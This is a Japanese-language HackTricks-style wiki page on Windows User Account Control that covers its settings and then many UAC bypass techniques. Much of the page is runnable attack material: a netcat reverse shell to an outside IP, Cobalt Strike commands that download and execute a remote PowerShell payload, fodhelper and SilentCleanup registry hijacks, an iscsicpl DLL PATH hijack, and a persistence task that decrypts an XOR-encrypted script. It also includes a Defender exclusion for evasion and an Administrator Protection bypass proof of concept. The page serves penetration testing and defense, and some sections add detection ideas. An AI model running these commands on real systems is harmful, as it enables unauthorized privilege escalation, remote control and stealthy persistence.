# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格されたアクティビティに対する同意プロンプト**を有効にする機能です。アプリケーションには異なる `integrity` レベルがあり、**高いレベル**のプログラムは、**システムを侵害する可能性のあるタスク**を実行できます。UAC が有効な場合、管理者がアプリケーションやタスクの実行にシステムへの管理者レベルのアクセスを明示的に許可しない限り、アプリケーションとタスクは常に**非管理者アカウントのセキュリティコンテキストで実行されます**。これは、意図しない変更から管理者を保護する便利な機能ですが、セキュリティ境界とはみなされません。<sup>[[2]](#references)</sup>

integrity レベルの詳細については、以下を参照してください。


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC が導入されている場合、管理者ユーザーには 2 つのトークンが付与されます。1 つは中程度の integrity で通常の操作を実行するための標準ユーザートークンで、もう 1 つは管理者権限を持つトークンです。

この [ページ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) では、ログオンプロセス、ユーザーエクスペリエンス、UAC アーキテクチャを含め、UAC の動作について詳しく説明しています。<sup>[[2]](#references)</sup> 管理者はセキュリティポリシーを使用して、組織における UAC の動作をローカルレベル（secpol.msc を使用）で設定したり、Active Directory ドメイン環境で Group Policy Objects (GPO) を介して設定および適用したりできます。各種設定については[こちら](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)で詳しく説明されています。UAC には設定可能な Group Policy 設定が 10 個あります。以下の表に詳細を示します。

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (無効)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (secure desktop 上で Windows 以外のバイナリに対する同意を求める) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (secure desktop 上で資格情報を求める)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (有効。Enterprise ではデフォルトで無効)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (無効)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (有効)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (有効)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (無効)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (有効)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (有効)                                              |

### Windows でソフトウェアをインストールするためのポリシー

**local security policies**（ほとんどのシステムでは "secpol.msc"）は、デフォルトで**非管理者ユーザーによるソフトウェアのインストールを防止する**ように設定されています。つまり、非管理者ユーザーがソフトウェアの installer をダウンロードできたとしても、管理者アカウントなしでは実行できません。

### UAC に昇格を求めさせるための Registry Keys

管理者権限を持たない標準ユーザーの場合、特定のアクションを実行しようとしたときに、UAC によって「標準」アカウントの**資格情報を求めるようにする**ことができます。この操作には特定の **registry keys** の変更が必要であり、そのためには管理者権限が必要です。ただし、**UAC bypass** が存在する場合、または attacker がすでに管理者としてログオンしている場合は除きます。

ユーザーが **Administrators** グループに所属している場合でも、これらの変更により、管理操作を実行するためにユーザーは**アカウントの資格情報を再入力する**必要があります。

**実際には、すでに elevated token、UAC bypass、またはこれらの keys を変更できる misconfiguration を取得している場合にのみ有用です。それ以外の場合、registry write 自体がブロックされます。**

変更する必要がある registry keys とエントリは以下のとおりです（括弧内はデフォルト値）。

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

これは Local Security Policy ツールから手動で行うこともできます。変更後は、管理操作を実行する際にユーザーへ資格情報の再入力が求められます。

### 注記

**User Account Control はセキュリティ境界ではありません。**したがって、標準ユーザーが local privilege escalation exploit なしにアカウントから抜け出し、管理者権限を取得することはできません。

### ユーザーに「コンピューターへの完全なアクセス」を求める
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode は、整合性チェックを使用して、高い整合性レベルのプロセス（Web ブラウザなど）が低い整合性レベルのデータ（一時 Internet ファイル フォルダーなど）にアクセスできないようにします。これは、ブラウザを低い整合性レベルの token で実行することで実現されます。ブラウザが低い整合性レベルのゾーンに保存されたデータへアクセスしようとすると、オペレーティングシステムはプロセスの整合性レベルを確認し、それに応じてアクセスを許可します。この機能により、remote code execution 攻撃がシステム上の機密データへアクセスするのを防止できます。
- ユーザーが Windows にログオンすると、システムはユーザーの privileges の一覧を含む access token を作成します。Privileges は、ユーザーの権限と capabilities の組み合わせとして定義されます。token にはユーザーの credentials の一覧も含まれます。これらの credentials は、ユーザーをコンピューターやネットワーク上のリソースに対して authenticate するために使用されます。

### Autoadminlogon

起動時に特定のユーザーへ Windows を自動的にログオンさせるには、**`AutoAdminLogon` registry key** を設定します。これは kiosk 環境やテスト目的で便利です。registry に password が公開されるため、安全なシステムでのみ使用してください。

Registry Editor または `reg add` を使用して、次の keys を設定します。

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

通常のログオン動作に戻すには、`AutoAdminLogon` を 0 に設定します。

## UAC bypass

> [!TIP]
> victim に graphical access がある場合、UAC bypass は簡単です。UAC prompt が表示されたときに「Yes」をクリックするだけでよいためです。

UAC bypass が必要になるのは、次の状況です。**UAC が有効化されており、process が medium integrity context で実行され、ユーザーが administrators group に所属している場合です。**

UAC が最高の security level（Always）に設定されている場合は、他の levels（Default）のいずれかに設定されている場合よりも、**UAC の bypass がはるかに困難になる**ことに注意してください。

### Fast triage from a medium-integrity shell

bypass を試す前に、適切な状況であることを確認し、host build を既知の動作する methods に対応付けます。
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
実践的なメモ:
- `EnableLUA=0` の場合、bypass は不要です。任意の admin token から直接 high integrity を要求できます。
- `ConsentPromptBehaviorAdmin=2` または `5` は、auto-elevate / COM-based bypasses の一般的なシナリオです。
- `Always Notify` は難易度を上げますが、失敗すると決めつけず、実際の build をテストすべきです。UACME は、modern Windows builds でも一部の `AlwaysNotify compatible` methods を引き続き追跡しています。<sup>[[3]](#references)</sup>

### UAC disabled

UAC がすでに無効（`ConsentPromptBehaviorAdmin` が **`0`**）の場合、次のような方法で **admin privileges**（high integrity level）を使用して reverse shell を実行できます。
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常に** Basic な UAC「bypass」（ファイルシステムへの完全なアクセス）

Administrators group に所属する user の shell がある場合、SMB 経由で共有されている **C$**（ファイルシステム）を新しいディスクにローカルで **mount** でき、**ファイルシステム内のすべてにアクセス**できます（Administrator の home folder も含む）。

> [!WARNING]
> **この trick は現在、機能しないようです**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt StrikeによるUAC bypass

Cobalt Strikeのtechniqueは、UACが最高セキュリティレベルに設定されていない場合にのみ機能します
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** と **Metasploit** には、**UAC** を **bypass** するためのモジュールも複数あります。

### 高権限 COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

自動昇格される COM objects は、現行の Windows builds でも実用的な UAC の攻撃面として残っています。`ICMLuaUtil` は現在の Windows branches でも動作するものとして UACME で追跡されており、攻撃用 tooling は、COM Elevation Moniker を呼び出す前に、interactive desktop process、64-bit execution、場合によっては PEB/process masquerading を組み合わせることで `CMSTPLUA` に対応し続けています。<sup>[[3]](#references)</sup>

実用的なヒント:
- ユーザーの **interactive session** で **64-bit** process（通常は `explorer.exe` またはその child）を優先してください。
- raw shell が失敗する場合は、単純な `CreateProcess` wrapper ではなく、BOF / UACME implementation から再試行してください。
- child execution は **separate elevated process** で実行されることを想定してください。多くの BOF は現在の beacon をその場で elevate しません。

### KRBUACBypass

Documentation and tool は [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) にあります。

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)は、複数の UAC bypass exploits をまとめた **compilation** です。**Visual Studio または msbuild を使用して UACME をコンパイルする**必要がある点に注意してください。コンパイルにより複数の executables（`Source\Akagi\outout\x64\Debug\Akagi.exe` など）が作成されるため、**どれが必要かを把握する必要があります。**\
一部の bypass は、何かが起きていることを **user** に **alert** する別のプログラムを **prompt** するため、**注意が必要です。**<sup>[[3]](#references)</sup>

UACME には、各 technique が動作し始めた **build version** が記載されています。<sup>[[3]](#references)</sup> 自分の versions に影響する technique を検索できます。
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
また、[この](https://en.wikipedia.org/wiki/Windows_10_version_history)ページを使用すると、ビルドバージョンから Windows release `1607` を取得できます。

実践的なワークフローでは、まず**ホストのビルドをスコアリング**し、その後に一致する method を実行します：
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` はローカルの build と既知の UAC methods をすばやく比較できるため、機能しない PoC を早期に除外するのに便利です。<sup>[[4]](#references)</sup>
- `UACME` は、bypass を正確な build に対応付けるための、現在も最良の public catalogue です。最近のリリースでは新しい methods が追加され、既存の methods も **Windows 11 25H2** に対して再テストされています。そのため、古い blog post が現在もそのまま適用できると判断する前に、README/release notes を再確認してください。<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

信頼されたバイナリである `fodhelper.exe` は、最新の Windows では自動的に昇格されます。起動時に、`DelegateExecute` verb を検証せずに、以下の per-user registry path を照会します。そこに command を仕込むことで、Administrators の user である Medium Integrity process から、UAC prompt なしで High Integrity process を起動できます。

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell steps (set your payload, then trigger)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes:
- 現在のユーザーが Administrators のメンバーで、UAC level が default/lenient の場合に機能します（Always Notify で追加の制限が有効になっている場合を除く）。
- 64-bit Windows 上で 32-bit process から 64-bit PowerShell を起動するには、`sysnative` path を使用します。
- Payload には任意の command（PowerShell、cmd、または EXE path）を指定できます。stealth のため、UI による prompt は避けてください。

#### CurVer/extension hijack variant (HKCU only)

最近の `fodhelper.exe` を悪用するサンプルでは、`DelegateExecute` を使用せず、per-user の `CurVer` value を介して **`ms-settings` ProgID を redirect** します。auto-elevated binary は引き続き `HKCU` 配下で handler を resolve するため、keys の作成に admin token は必要ありません:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
権限昇格後、malwareは一般的に `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` を `0` に設定して**今後のプロンプトを無効化**し、その後、追加の defense evasion（例：`Add-MpPreference -ExclusionPath C:\ProgramData`）を実行して、高い整合性レベルで実行されるよう persistence を再作成します。典型的な persistence task では、**XOR-encrypted PowerShell script**をディスク上に保存し、1時間ごとにメモリ内で復号して実行します：<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
この variant でも dropper をクリーンアップし、staged payloads だけを残すため、検出には **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` の tampering、Defender exclusion の作成、またはメモリ上で PowerShell を decrypt する scheduled tasks の監視が必要になります。<sup>[[5]](#references)</sup>

### `SilentCleanup` task による UAC bypass（`HKCU\Environment\windir`）

`SilentCleanup` は `cleanmgr.exe` を highest privileges で起動し、ユーザー環境から `%windir%` を展開します。`HKCU\Environment\windir` を制御できる場合、その展開先を任意の command に redirect し、consent dialog なしで high integrity を取得できます。<sup>[[8]](#references)</sup> UACME がこの technique を有効な状態に保っており、最近の issue tracking でも Windows 11 24H2 では quoting の小さな調整だけが必要になる可能性が示されているため、recent builds でもこの method は引き続き testing する価値があります。<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
ビルド上でそのパスがクォートされる場合は、ペイロードをクォートで終わらせて再試行します（例: `cmd.exe"`）。テスト後は必ず `HKCU\Environment\windir` をクリーンアップしてください。

#### More UAC bypass

UIフロー、COMオブジェクト、またはデスクトップ操作を悪用する従来のUAC bypassの多くでは、被害者の**完全なインタラクティブセッション**が必要です。一般的な`nc.exe` shellや**Session 0**で実行されているサービスでは、多くの場合十分ではありません。

多くの場合、**meterpreter** sessionを使って解決できます。**Session**の値が**1**と等しい**process**へ移行します：

![ms-settingsをカスタム拡張子（.thm）に指定し、その拡張子をペイロードにマッピングする - More UAC bypass: meterpreter sessionで利用できます。Session...](<../../images/image (863).png>)

(_explorer.exe_ should works)

### GUIによるUAC Bypass

**GUIにアクセスできる場合、UAC promptが表示されたときに受け入れるだけで済みます**。技術的なbypassは実際には必要ありません。そのため、GUI sessionを取得するだけで、UACによって追加される実際上の障壁を回避できることがよくあります。

さらに、誰かが使用していたGUI session（RDP経由の可能性があります）を取得した場合、**administratorとして実行されているツールがいくつか存在する可能性があります**。そこから、例えば**cmd**を**adminとして実行**すれば、[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)のように、UACによる再度のpromptなしで直接実行できます。こちらの方がやや**stealthy**かもしれません。

### Noisy brute-force UAC bypass

noisyであることを気にしないなら、[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin)のようなものを**実行して、ユーザーが受け入れるまで権限の昇格を要求し続ける**ことができます。

### 独自のbypass - Basic UAC bypass methodology

**UACME**を見ると、**多くのUAC bypassがDLL hijackingを悪用している**ことがわかります（多くの場合、昇格されたbinaryに、書き込み可能なpathから攻撃者が制御するDLLをloadさせます）。[DLL hijacking vulnerabilityの見つけ方についてはこちらを読んでください](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. **autoelevate**するbinaryを見つけます（実行時にhigh integrity levelで実行されることを確認します）。
2. procmonを使い、**DLL Hijacking**に対して脆弱である可能性のある "**NAME NOT FOUND**"イベントを見つけます。
3. おそらく、DLLをいくつかの**protected paths**（C:\Windows\System32など）内に**write**する必要がありますが、そこには書き込み権限がありません。以下を使ってこれをbypassできます：
1. **wusa.exe**：Windows 7、8、8.1。high integrity levelから実行されるため、CAB fileの内容をprotected paths内にextractできます。
2. **IFileOperation**：Windows 10。
4. DLLをprotected path内にcopyし、脆弱でautoelevatedなbinaryを実行する**script**を準備します。

### Another UAC bypass technique

**autoElevated binary**が、**実行される****binary**または**command**の**name/path**を**registry**から**read**しようとしているかを監視します（binaryがこの情報を**HKCU**内から検索する場合は、より興味深いものになります）。

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijackによるUAC bypass

32-bitの`C:\Windows\SysWOW64\iscsicpl.exe`は、search orderによって`iscsiexe.dll`をloadさせるために悪用できる**auto-elevated** binaryです。悪意のある`iscsiexe.dll`を**user-writable** folder内に配置し、現在のuserの`PATH`（例えば`HKCU\Environment\Path`経由）を変更してそのfolderが検索されるようにすると、WindowsはUAC promptを表示せずに、攻撃者のDLLを昇格された`iscsicpl.exe` process内にloadする可能性があります。<sup>[[1]](#references)[[6]](#references)</sup>

実用上の注意：
- これは、現在のuserが**Administrators**に所属しているものの、UACによって**Medium Integrity**で実行されている場合に有用です。
- このbypassで関連するのは**SysWOW64**側のcopyです。**System32**側のcopyは別のbinaryとして扱い、動作を個別に検証してください。
- このprimitiveは**auto-elevation**と**DLL search-order hijacking**の組み合わせです。そのため、他のUAC bypassで使用するものと同じProcMon workflowが、見つからないDLL loadの検証に役立ちます。

最小限のflow：
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- `reg add` / `HKCU\Environment\Path` へのレジストリ書き込みに続いて、直ちに `C:\Windows\SysWOW64\iscsicpl.exe` が実行された場合に Alert を発する。
- `%TEMP%` や `%LOCALAPPDATA%\Microsoft\WindowsApps` など、**user-controlled** な場所にある `iscsiexe.dll` を Hunt する。
- `iscsicpl.exe` の起動と、想定外の child process や通常の Windows ディレクトリ外からの DLL loads を Correlate する。

### Newer research worth checking separately

一部の post-2024 chains は、従来の `HKCU\Software\Classes` registry hijacks とは異なる挙動を示します。たとえば、activation-context cache poisoning に **drive remap** と **DLL redirection** を組み合わせ、`ctfmon.exe` や、後続のターゲットである `fodhelper.exe` など、trusted UI / auto-elevated binaries を介して medium integrity から high integrity へ移行できます。ここで大規模な PoC を重複して掲載する代わりに、以下にある簡潔な payload examples を確認してください。

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 における完全な `RAiLaunchAdminProcess` / UIAccess attack surface については、専用ページを確認してください。

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 の “Administrator Protection” は、per-session `\Sessions\0\DosDevices/<LUID>` maps を持つ shadow-admin tokens を使用します。この directory は、最初の `\??` resolution 時に `SeGetTokenDeviceMap` によって lazy に作成されます。攻撃者が shadow-admin token を **SecurityIdentification** のみで impersonate すると、directory は攻撃者を **owner** として作成され（`CREATOR OWNER` を継承）、`\GLOBAL??` より優先される drive-letter links が可能になります。<sup>[[7]](#references)</sup>

**Steps:**

1. low-privileged session から `RAiProcessRunOnce` を呼び出し、promptless shadow-admin `runonce.exe` を spawn する。
2. その primary token を **identification** token に Duplicate し、`\??` を開く間 impersonate して、`\Sessions\0\DosDevices/<LUID>` を攻撃者の ownership で強制的に作成する。
3. そこに攻撃者が制御する storage を指す `C:` symlink を作成する。その session で後続の filesystem accesses が `C:` を攻撃者の path として resolve するため、prompt なしで DLL/file hijack が可能になる。

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## 参考文献

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – User Account Control の仕組み](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass techniques のコレクション](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass compatibility scanner and launcher](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Southeast Asian Government Targets に対する 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection の Bypassing](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task を使用した Bypass UAC](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
